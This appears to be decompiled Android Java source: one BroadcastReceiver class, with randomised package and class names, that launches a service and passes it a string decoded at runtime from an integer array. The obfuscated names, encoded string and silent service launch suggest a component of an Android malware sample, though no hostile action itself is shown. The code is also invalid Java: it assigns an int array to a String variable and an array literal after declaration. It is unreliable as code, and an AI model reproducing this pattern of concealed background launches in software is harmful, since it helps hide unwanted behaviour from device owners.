package tev.piqgahor;
public class mdjrN38j extends android.content.BroadcastReceiver {

    public mdjrN38j()
    {
        return;
    }

    public void onReceive(android.content.Context p4, android.content.Intent p5)
    {
        if (p4 != null) {
            android.content.Intent v0_1 = new android.content.Intent(p4, tev.piqgahor.ttnC03lWapO);
            String v2_1 = new int[13];
            v2_1 = {36, 118, 137, 151, 152, 133, 150, 152, 116, 140, 147, 146, 137};
            v0_1.putExtra(tev.piqgahor.jzVO9lP4.gg6NkF2pzSP, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_1));
            p4.startService(v0_1);
        }
        return;
    }
}
